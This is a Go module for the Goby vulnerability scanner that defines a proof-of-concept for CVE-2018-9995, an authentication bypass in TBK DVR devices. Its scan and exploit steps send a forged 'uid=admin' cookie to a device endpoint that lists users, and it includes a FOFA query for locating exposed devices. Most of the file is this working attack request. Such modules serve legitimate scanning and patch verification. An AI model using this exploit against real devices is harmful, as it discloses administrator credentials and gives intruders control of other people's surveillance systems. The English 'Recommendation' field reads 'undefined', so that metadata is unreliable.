package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "DVR Login bypass (CVE-2018-9995)",
    "Description": "This vulnerability allows an attacker to modify the Cookie:uid=admin ”Then access the control panel of a specific DVR and return the clear text administrator credentials of the device",
    "Impact": "DVR Login bypass (CVE-2018-9995)",
    "Recommendation": "<p>undefined</p>",
    "Product": "DVR",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "TBK DVR device.rsp 密码泄露导致登录绕过",
            "Description": "TBK DVR device.rsp 加上特定参数和cookie，可泄露登录密码导致登录绕过",
            "Impact": "<p>攻击者可直接下载用户的相关信息，包括网站的绝对路径、用户的登录名、密码、真实姓名、身份证号、电话号码、邮箱、QQ号等。</p><p>攻击者通过构造特殊URL地址，触发系统web应用程序报错，在回显内容中，获取网站敏感信息。</p><p>攻击者利用泄漏的敏感信息，获取网站服务器web路径，为进一步攻击提供帮助。</p>",
            "Recommendation": "<p>对网站错误信息进行统一返回，模糊化处理。</p><p>对存放敏感信息的文件进行加密并妥善储存，避免泄漏敏感信息。</p>",
            "Product": "TBK-DVR",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "DVR Login bypass (CVE-2018-9995)",
            "Description": "This vulnerability allows an attacker to modify the Cookie:uid=admin ”Then access the control panel of a specific DVR and return the clear text administrator credentials of the device",
            "Impact": "DVR Login bypass (CVE-2018-9995)",
            "Recommendation": "<p>undefined</p>",
            "Product": "DVR",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "header=\"GNU rsp/1.0\"",
    "GobyQuery": "header=\"GNU rsp/1.0\"",
    "Author": "shiguang",
    "Homepage": "http://tbkvision.com/",
    "DisclosureDate": "2021-04-18",
    "References": [
        "https://www.cnblogs.com/yuzly/p/11105086.html"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.6",
    "CVEIDs": [
        "CVE-2018-9995"
    ],
    "CNVD": [
        "CNVD-2018-08885"
    ],
    "CNNVD": [
        "CNNVD-201804-454"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/device.rsp?opt=user&cmd=list",
                "follow_redirect": true,
                "header": {
                    "Cookie": "uid=admin"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "admin",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/device.rsp?opt=user&cmd=list",
                "follow_redirect": true,
                "header": {
                    "Cookie": "uid=admin"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "admin",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
